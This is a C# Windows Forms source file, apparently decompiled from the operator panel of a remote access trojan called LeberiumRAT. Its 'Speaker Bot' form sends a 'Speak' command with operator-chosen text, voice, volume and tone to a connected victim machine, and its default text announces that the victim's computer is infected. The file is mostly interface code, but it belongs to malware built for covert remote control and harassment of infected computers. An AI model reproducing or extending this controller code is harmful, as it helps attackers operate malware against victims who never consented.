using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormSpeakerBot : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Timer timer1;

	private Panel panel1;

	public RichTextBox richTextBox1;

	private MaterialLabel materialLabel3;

	public RJComboBox rjComboBox1;

	public RJButton rjButton1;

	public MaterialSlider materialSlider1;

	public MaterialSlider materialSlider2;

	public FormSpeakerBot()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		try
		{
			MaterialSlider slider = materialSlider1;
			PropertyInfo valueProperty = slider.GetType().GetProperty("Value");
			PropertyInfo minProperty = slider.GetType().GetProperty("RangeMin");
			PropertyInfo maxProperty = slider.GetType().GetProperty("RangeMax");
			if (minProperty != null)
			{
				minProperty.SetValue(slider, 0);
			}
			if (maxProperty != null)
			{
				maxProperty.SetValue(slider, 100);
			}
			if (valueProperty != null)
			{
				valueProperty.SetValue(slider, 100);
			}
		}
		catch
		{
		}
		try
		{
			MaterialSlider slider2 = materialSlider2;
			PropertyInfo valueProperty2 = slider2.GetType().GetProperty("Value");
			PropertyInfo minProperty2 = slider2.GetType().GetProperty("RangeMin");
			PropertyInfo maxProperty2 = slider2.GetType().GetProperty("RangeMax");
			if (minProperty2 != null)
			{
				minProperty2.SetValue(slider2, -10);
			}
			if (maxProperty2 != null)
			{
				maxProperty2.SetValue(slider2, 10);
			}
			if (valueProperty2 != null)
			{
				valueProperty2.SetValue(slider2, 0);
			}
		}
		catch
		{
		}
		timer1.Start();
	}

	private void ChangeScheme(object sender)
	{
		Color primary = FormMaterial.PrimaryColor;
		bool num = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		Color editBack = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		Color text = (num ? Color.WhiteSmoke : Color.Black);
		BackColor = back;
		panel1.BackColor = back;
		if (materialSlider1 != null)
		{
			materialSlider1.BackColor = back;
			materialSlider1.Invalidate();
		}
		if (materialSlider2 != null)
		{
			materialSlider2.BackColor = back;
			materialSlider2.Invalidate();
		}
		richTextBox1.BackColor = back;
		richTextBox1.ForeColor = primary;
		rjButton1.BorderColor = primary;
		rjButton1.BackColor = primary;
		rjButton1.BackgroundColor = primary;
		rjButton1.ForeColor = text;
		rjButton1.TextColor = text;
		rjComboBox1.BorderColor = primary;
		rjComboBox1.IconColor = primary;
		rjComboBox1.BackColor = editBack;
		rjComboBox1.ForeColor = text;
		rjComboBox1.ListBackColor = editBack;
		rjComboBox1.ListTextColor = text;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void rjButton1_Click_1(object sender, EventArgs e)
	{
		if (client.itsConnect && rjComboBox1.SelectedIndex != 0)
		{
			client.Send(new object[5]
			{
				"Speak",
				GetSlider2Value(),
				GetSliderValue(),
				((string)rjComboBox1.SelectedItem).Split(new string[1] { " | " }, StringSplitOptions.None)[0],
				richTextBox1.Text
			});
		}
	}

	private void materialSlider1_MouseUp(object sender, MouseEventArgs e)
	{
		UpdateVolumeDisplay();
	}

	private void materialSlider1_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			UpdateVolumeDisplay();
		}
	}

	private void materialSlider1_Click(object sender, EventArgs e)
	{
		UpdateVolumeDisplay();
	}

	private void materialSlider2_MouseUp(object sender, MouseEventArgs e)
	{
		UpdateToneDisplay();
	}

	private void materialSlider2_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			UpdateToneDisplay();
		}
	}

	private void materialSlider2_Click(object sender, EventArgs e)
	{
		UpdateToneDisplay();
	}

	private void UpdateVolumeDisplay()
	{
	}

	private void UpdateToneDisplay()
	{
	}

	private int GetSliderValue()
	{
		if (materialSlider1 == null)
		{
			return 100;
		}
		try
		{
			return materialSlider1.Value;
		}
		catch
		{
			try
			{
				PropertyInfo valueProperty = materialSlider1.GetType().GetProperty("Value");
				if (valueProperty != null)
				{
					return (int)valueProperty.GetValue(materialSlider1);
				}
			}
			catch
			{
			}
			return 100;
		}
	}

	private int GetSlider2Value()
	{
		if (materialSlider2 == null)
		{
			return 0;
		}
		try
		{
			return materialSlider2.Value;
		}
		catch
		{
			try
			{
				PropertyInfo valueProperty = materialSlider2.GetType().GetProperty("Value");
				if (valueProperty != null)
				{
					return (int)valueProperty.GetValue(materialSlider2);
				}
			}
			catch
			{
			}
			return 0;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialSlider2 = new MaterialSkin.Controls.MaterialSlider();
		this.materialSlider1 = new MaterialSkin.Controls.MaterialSlider();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.rjComboBox1 = new CustomControls.RJControls.RJComboBox();
		this.materialLabel3 = new MaterialSkin.Controls.MaterialLabel();
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.panel1.Controls.Add(this.materialSlider2);
		this.panel1.Controls.Add(this.materialSlider1);
		this.panel1.Controls.Add(this.rjButton1);
		this.panel1.Controls.Add(this.rjComboBox1);
		this.panel1.Controls.Add(this.materialLabel3);
		this.panel1.Controls.Add(this.richTextBox1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(524, 479);
		this.panel1.TabIndex = 0;
		this.materialSlider2.Depth = 0;
		this.materialSlider2.ForeColor = System.Drawing.Color.FromArgb(222, 0, 0, 0);
		this.materialSlider2.Location = new System.Drawing.Point(10, 374);
		this.materialSlider2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSlider2.Name = "materialSlider2";
		this.materialSlider2.Size = new System.Drawing.Size(338, 40);
		this.materialSlider2.TabIndex = 38;
		this.materialSlider2.Text = "Tone Speak";
		this.materialSlider2.Click += new System.EventHandler(materialSlider2_Click);
		this.materialSlider2.MouseMove += new System.Windows.Forms.MouseEventHandler(materialSlider2_MouseMove);
		this.materialSlider2.MouseUp += new System.Windows.Forms.MouseEventHandler(materialSlider2_MouseUp);
		this.materialSlider1.Depth = 0;
		this.materialSlider1.ForeColor = System.Drawing.Color.FromArgb(222, 0, 0, 0);
		this.materialSlider1.Location = new System.Drawing.Point(10, 328);
		this.materialSlider1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSlider1.Name = "materialSlider1";
		this.materialSlider1.Size = new System.Drawing.Size(338, 40);
		this.materialSlider1.TabIndex = 37;
		this.materialSlider1.Text = "Volume";
		this.materialSlider1.Value = 100;
		this.materialSlider1.Click += new System.EventHandler(materialSlider1_Click);
		this.materialSlider1.MouseMove += new System.Windows.Forms.MouseEventHandler(materialSlider1_MouseMove);
		this.materialSlider1.MouseUp += new System.Windows.Forms.MouseEventHandler(materialSlider1_MouseUp);
		this.rjButton1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.rjButton1.BackColor = System.Drawing.Color.White;
		this.rjButton1.BackgroundColor = System.Drawing.Color.White;
		this.rjButton1.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 1;
		this.rjButton1.Enabled = false;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.Location = new System.Drawing.Point(395, 376);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(92, 30);
		this.rjButton1.TabIndex = 36;
		this.rjButton1.Text = "Speak";
		this.rjButton1.TextColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click_1);
		this.rjComboBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.rjComboBox1.BackColor = System.Drawing.Color.WhiteSmoke;
		this.rjComboBox1.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjComboBox1.BorderSize = 1;
		this.rjComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox1.Enabled = false;
		this.rjComboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox1.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.IconColor = System.Drawing.Color.MediumSlateBlue;
		this.rjComboBox1.ListBackColor = System.Drawing.Color.FromArgb(230, 228, 245);
		this.rjComboBox1.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.Location = new System.Drawing.Point(98, 429);
		this.rjComboBox1.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox1.Name = "rjComboBox1";
		this.rjComboBox1.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox1.Size = new System.Drawing.Size(250, 30);
		this.rjComboBox1.TabIndex = 35;
		this.rjComboBox1.Texts = "";
		this.materialLabel3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.materialLabel3.AutoSize = true;
		this.materialLabel3.Depth = 0;
		this.materialLabel3.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel3.Location = new System.Drawing.Point(7, 428);
		this.materialLabel3.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel3.Name = "materialLabel3";
		this.materialLabel3.Size = new System.Drawing.Size(48, 19);
		this.materialLabel3.TabIndex = 34;
		this.materialLabel3.Text = "Voices";
		this.richTextBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.richTextBox1.BackColor = System.Drawing.Color.White;
		this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBox1.Enabled = false;
		this.richTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.richTextBox1.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.richTextBox1.Location = new System.Drawing.Point(0, 0);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.Size = new System.Drawing.Size(521, 321);
		this.richTextBox1.TabIndex = 2;
		this.richTextBox1.Text = "Your fucking computer infected by LeberiumRAT";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(530, 546);
		base.Controls.Add(this.panel1);
		base.Name = "FormSpeakerBot";
		this.Text = "Speaker Bot";
		base.Load += new System.EventHandler(FormProcess_Load);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		base.ResumeLayout(false);
	}
}
